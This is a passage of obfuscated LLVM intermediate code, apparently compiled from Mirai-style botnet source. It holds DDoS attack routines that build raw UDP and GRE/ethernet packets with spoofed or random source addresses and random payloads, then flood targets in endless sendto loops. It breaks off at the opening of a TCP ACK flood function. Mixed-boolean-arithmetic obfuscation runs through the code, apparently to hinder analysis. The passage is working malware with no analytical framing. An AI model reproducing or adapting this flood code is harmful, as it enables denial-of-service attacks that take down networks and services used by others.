; <label>:482:                                    ; preds = %479
  %483 = call i32 @rand_next()
  %484 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 9
  store i32 %483, i32* %485, align 4
  br label %492

; <label>:486:                                    ; preds = %479
  %487 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 9
  %489 = load i32, i32* %488, align 4
  %490 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 9
  store i32 %489, i32* %491, align 4
  br label %492

; <label>:492:                                    ; preds = %486, %482
  %493 = call i32 @rand_next()
  store i32 %493, i32* %37, align 4
  %494 = call i32 @rand_next()
  store i32 %494, i32* %38, align 4
  %495 = call i32 @rand_next()
  store i32 %495, i32* %39, align 4
  %496 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %497 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %496, i32 0, i32 0
  %498 = getelementptr inbounds [6 x i8], [6 x i8]* %497, i32 0, i32 0
  %499 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %498, i8* %499, i32 4)
  %500 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %501 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %500, i32 0, i32 1
  %502 = getelementptr inbounds [6 x i8], [6 x i8]* %501, i32 0, i32 0
  %503 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %502, i8* %503, i32 4)
  %504 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %505 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %504, i32 0, i32 0
  %506 = getelementptr inbounds [6 x i8], [6 x i8]* %505, i32 0, i32 0
  %507 = getelementptr inbounds i8, i8* %506, i64 4
  %508 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %507, i8* %508, i32 2)
  %509 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %510 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %509, i32 0, i32 1
  %511 = getelementptr inbounds [6 x i8], [6 x i8]* %510, i32 0, i32 0
  %512 = getelementptr inbounds i8, i8* %511, i64 4
  %513 = bitcast i32* %39 to i8*
  %514 = getelementptr inbounds i8, i8* %513, i64 2
  call void @util_memcpy(i8* %512, i8* %514, i32 2)
  %515 = load i8, i8* %19, align 1
  %516 = icmp ne i8 %515, 0
  br i1 %516, label %517, label %520

; <label>:517:                                    ; preds = %492
  %518 = load i8*, i8** %36, align 8
  %519 = load i32, i32* %18, align 4
  call void @rand_str(i8* %518, i32 %519)
  br label %520

; <label>:520:                                    ; preds = %517, %492
  %521 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 7
  store i16 0, i16* %522, align 2
  %523 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %524 = bitcast %struct.iphdr* %523 to i16*
  %525 = call zeroext i16 @checksum_generic(i16* %524, i32 20)
  %526 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 7
  store i16 %525, i16* %527, align 2
  %528 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 7
  store i16 0, i16* %529, align 2
  %530 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %531 = bitcast %struct.iphdr* %530 to i16*
  %532 = call zeroext i16 @checksum_generic(i16* %531, i32 20)
  %533 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 7
  store i16 %532, i16* %534, align 2
  %535 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %536 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %535, i32 0, i32 3
  store i16 0, i16* %536, align 2
  %537 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %538 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %539 = bitcast %struct.udphdr* %538 to i8*
  %540 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %541 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %540, i32 0, i32 2
  %542 = load i16, i16* %541, align 2
  %543 = load i32, i32* %18, align 4
  %544 = sext i32 %543 to i64
  %545 = sub i64 8, 420825848878400909
  %546 = add i64 %545, %544
  %547 = add i64 %546, 420825848878400909
  %548 = add i64 8, %544
  %549 = trunc i64 %547 to i32
  %550 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %537, i8* %539, i16 zeroext %542, i32 %549)
  %551 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %552 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %551, i32 0, i32 3
  store i16 %550, i16* %552, align 2
  %553 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %554 = load i32, i32* %9, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %553, i64 %555
  %557 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %556, i32 0, i32 0
  %558 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %557, i32 0, i32 0
  store i16 2, i16* %558, align 4
  %559 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %560 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %559, i32 0, i32 9
  %561 = load i32, i32* %560, align 4
  %562 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %563 = load i32, i32* %9, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i64 %564
  %566 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %565, i32 0, i32 0
  %567 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %566, i32 0, i32 2
  %568 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %567, i32 0, i32 0
  store i32 %561, i32* %568, align 4
  %569 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %570 = load i32, i32* %9, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %569, i64 %571
  %573 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %572, i32 0, i32 0
  %574 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %573, i32 0, i32 1
  store i16 0, i16* %574, align 2
  %575 = load i32, i32* %10, align 4
  %576 = load i8*, i8** %30, align 8
  %577 = load i32, i32* %18, align 4
  %578 = sext i32 %577 to i64
  %579 = add i64 66, 7272011090547751584
  %580 = add i64 %579, %578
  %581 = sub i64 %580, 7272011090547751584
  %582 = add i64 66, %578
  %583 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %584 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %585 = load i32, i32* %9, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = bitcast %struct.sockaddr_in* %588 to %struct.sockaddr*
  store %struct.sockaddr* %589, %struct.sockaddr** %583, align 8
  %590 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %591 = load %struct.sockaddr*, %struct.sockaddr** %590, align 8
  %592 = call i64 @sendto(i32 %575, i8* %576, i64 %581, i32 16384, %struct.sockaddr* %591, i32 16)
  br label %593

; <label>:593:                                    ; preds = %520
  %594 = load i32, i32* %9, align 4
  %595 = sub i32 0, 1
  %596 = sub i32 %594, %595
  %597 = add nsw i32 %594, 1
  store i32 %596, i32* %9, align 4
  br label %343

; <label>:598:                                    ; preds = %343
  br label %342

; <label>:599:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udprandom(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 1458)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1458
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1458, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %371

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %371

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %205, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %211

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 %107, -1
  %109 = xor i8 15, -1
  %110 = xor i8 93, -1
  %111 = or i8 %108, %109
  %112 = or i8 93, %110
  %113 = xor i8 %111, -1
  %114 = and i8 %113, %112
  %115 = and i8 %107, 15
  %116 = xor i8 %114, -1
  %117 = xor i8 64, -1
  %118 = xor i8 45, -1
  %119 = and i8 %116, 45
  %120 = and i8 %114, %118
  %121 = and i8 %117, 45
  %122 = and i8 64, %118
  %123 = or i8 %119, %120
  %124 = or i8 %121, %122
  %125 = xor i8 %123, %124
  %126 = or i8 %116, %117
  %127 = xor i8 %126, -1
  %128 = or i8 45, %118
  %129 = and i8 %127, %128
  %130 = or i8 %125, %129
  %131 = or i8 %114, 64
  store i8 %130, i8* %106, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = xor i8 %134, -1
  %136 = xor i8 -16, -1
  %137 = xor i8 -45, -1
  %138 = or i8 %135, %136
  %139 = or i8 -45, %137
  %140 = xor i8 %138, -1
  %141 = and i8 %140, %139
  %142 = and i8 %134, -16
  %143 = and i8 %141, 5
  %144 = xor i8 %141, 5
  %145 = or i8 %143, %144
  %146 = or i8 %141, 5
  store i8 %145, i8* %133, align 4
  %147 = load i8, i8* %12, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 1
  store i8 %147, i8* %149, align 1
  %150 = load i16, i16* %18, align 2
  %151 = zext i16 %150 to i64
  %152 = sub i64 28, -3323838376756779448
  %153 = add i64 %152, %151
  %154 = add i64 %153, -3323838376756779448
  %155 = add i64 28, %151
  %156 = trunc i64 %154 to i16
  %157 = call zeroext i16 @htons(i16 zeroext %156) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 2
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %13, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 3
  store i16 %161, i16* %163, align 4
  %164 = load i8, i8* %14, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 5
  store i8 %164, i8* %166, align 4
  %167 = load i8, i8* %15, align 1
  %168 = icmp ne i8 %167, 0
  br i1 %168, label %169, label %173

; <label>:169:                                    ; preds = %90
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 4
  store i16 %170, i16* %172, align 2
  br label %173

; <label>:173:                                    ; preds = %169, %90
  %174 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 6
  store i8 17, i8* %175, align 1
  %176 = load i32, i32* %20, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 8
  store i32 %176, i32* %178, align 4
  %179 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i32 0, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 9
  store i32 %184, i32* %186, align 4
  %187 = load i16, i16* %16, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %17, align 2
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %18, align 2
  %196 = zext i16 %195 to i64
  %197 = add i64 8, -1296987334237962614
  %198 = add i64 %197, %196
  %199 = sub i64 %198, -1296987334237962614
  %200 = add i64 8, %196
  %201 = trunc i64 %199 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %204 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %203, i32 0, i32 2
  store i16 %202, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %173
  %206 = load i32, i32* %9, align 4
  %207 = sub i32 %206, 1995393510
  %208 = add i32 %207, 1
  %209 = add i32 %208, 1995393510
  %210 = add nsw i32 %206, 1
  store i32 %209, i32* %9, align 4
  br label %85

; <label>:211:                                    ; preds = %85
  br label %212

; <label>:212:                                    ; preds = %370, %211
  store i32 0, i32* %9, align 4
  br label %213

; <label>:213:                                    ; preds = %365, %212
  %214 = load i32, i32* %9, align 4
  %215 = load i8, i8* %5, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp slt i32 %214, %216
  br i1 %217, label %218, label %370

; <label>:218:                                    ; preds = %213
  %219 = load i8**, i8*** %11, align 8
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8*, i8** %219, i64 %221
  %223 = load i8*, i8** %222, align 8
  store i8* %223, i8** %23, align 8
  %224 = load i8*, i8** %23, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  store %struct.iphdr* %225, %struct.iphdr** %24, align 8
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i64 1
  %228 = bitcast %struct.iphdr* %227 to %struct.udphdr*
  store %struct.udphdr* %228, %struct.udphdr** %25, align 8
  %229 = call i32 @rand() #6
  %230 = srem i32 %229, 4096
  %231 = sub i32 0, %230
  %232 = sub i32 0, 1
  %233 = add i32 %231, %232
  %234 = sub i32 0, %233
  %235 = add nsw i32 %230, 1
  %236 = sext i32 %234 to i64
  %237 = inttoptr i64 %236 to i8*
  store i8* %237, i8** %26, align 8
  %238 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 2
  %243 = load i8, i8* %242, align 4
  %244 = zext i8 %243 to i32
  %245 = icmp slt i32 %244, 32
  br i1 %245, label %246, label %270

; <label>:246:                                    ; preds = %218
  %247 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 1
  %252 = load i32, i32* %251, align 4
  %253 = call i32 @ntohl(i32 %252) #7
  %254 = call i32 @rand_next()
  %255 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %256 = load i32, i32* %9, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %255, i64 %257
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %258, i32 0, i32 2
  %260 = load i8, i8* %259, align 4
  %261 = zext i8 %260 to i32
  %262 = lshr i32 %254, %261
  %263 = add i32 %253, 652136088
  %264 = add i32 %263, %262
  %265 = sub i32 %264, 652136088
  %266 = add i32 %253, %262
  %267 = call i32 @htonl(i32 %265) #7
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %270

; <label>:270:                                    ; preds = %246, %218
  %271 = load i32, i32* %20, align 4
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %273, label %277

; <label>:273:                                    ; preds = %270
  %274 = call i32 @rand_next()
  %275 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 8
  store i32 %274, i32* %276, align 4
  br label %277

; <label>:277:                                    ; preds = %273, %270
  %278 = load i16, i16* %13, align 2
  %279 = zext i16 %278 to i32
  %280 = icmp eq i32 %279, 65535
  br i1 %280, label %281, label %286

; <label>:281:                                    ; preds = %277
  %282 = call i32 @rand_next()
  %283 = trunc i32 %282 to i16
  %284 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 4
  br label %286

; <label>:286:                                    ; preds = %281, %277
  %287 = load i16, i16* %16, align 2
  %288 = zext i16 %287 to i32
  %289 = icmp eq i32 %288, 65535
  br i1 %289, label %290, label %295

; <label>:290:                                    ; preds = %286
  %291 = call i32 @rand_next()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 0
  store i16 %292, i16* %294, align 2
  br label %295

; <label>:295:                                    ; preds = %290, %286
  %296 = load i16, i16* %17, align 2
  %297 = zext i16 %296 to i32
  %298 = icmp eq i32 %297, 65535
  br i1 %298, label %299, label %304

; <label>:299:                                    ; preds = %295
  %300 = call i32 @rand_next()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 1
  store i16 %301, i16* %303, align 2
  br label %304

; <label>:304:                                    ; preds = %299, %295
  %305 = load i8, i8* %19, align 1
  %306 = icmp ne i8 %305, 0
  br i1 %306, label %307, label %311

; <label>:307:                                    ; preds = %304
  %308 = load i8*, i8** %26, align 8
  %309 = load i16, i16* %18, align 2
  %310 = zext i16 %309 to i32
  call void @rand_str(i8* %308, i32 %310)
  br label %311

; <label>:311:                                    ; preds = %307, %304
  %312 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 7
  store i16 0, i16* %313, align 2
  %314 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %315 = bitcast %struct.iphdr* %314 to i16*
  %316 = call zeroext i16 @checksum_generic(i16* %315, i32 20)
  %317 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 7
  store i16 %316, i16* %318, align 2
  %319 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 3
  store i16 0, i16* %320, align 2
  %321 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %322 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %323 = bitcast %struct.udphdr* %322 to i8*
  %324 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 2
  %326 = load i16, i16* %325, align 2
  %327 = load i16, i16* %18, align 2
  %328 = zext i16 %327 to i64
  %329 = add i64 8, -6744271778655404157
  %330 = add i64 %329, %328
  %331 = sub i64 %330, -6744271778655404157
  %332 = add i64 8, %328
  %333 = trunc i64 %331 to i32
  %334 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %321, i8* %323, i16 zeroext %326, i32 %333)
  %335 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %336 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %335, i32 0, i32 3
  store i16 %334, i16* %336, align 2
  %337 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %338 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %337, i32 0, i32 1
  %339 = load i16, i16* %338, align 2
  %340 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %341 = load i32, i32* %9, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i64 %342
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i32 0, i32 0
  %345 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %344, i32 0, i32 1
  store i16 %339, i16* %345, align 2
  %346 = load i32, i32* %10, align 4
  %347 = load i8*, i8** %23, align 8
  %348 = load i16, i16* %18, align 2
  %349 = zext i16 %348 to i64
  %350 = sub i64 0, 28
  %351 = sub i64 0, %349
  %352 = add i64 %350, %351
  %353 = sub i64 0, %352
  %354 = add i64 28, %349
  %355 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %356 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i32 0, i32 0
  %361 = bitcast %struct.sockaddr_in* %360 to %struct.sockaddr*
  store %struct.sockaddr* %361, %struct.sockaddr** %355, align 8
  %362 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %363 = load %struct.sockaddr*, %struct.sockaddr** %362, align 8
  %364 = call i64 @sendto(i32 %346, i8* %347, i64 %353, i32 16384, %struct.sockaddr* %363, i32 16)
  br label %365

; <label>:365:                                    ; preds = %311
  %366 = load i32, i32* %9, align 4
  %367 = sub i32 0, 1
  %368 = sub i32 %366, %367
  %369 = add nsw i32 %366, 1
  store i32 %368, i32* %9, align 4
  br label %213

; <label>:370:                                    ; preds = %213
  br label %212

; <label>:371:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
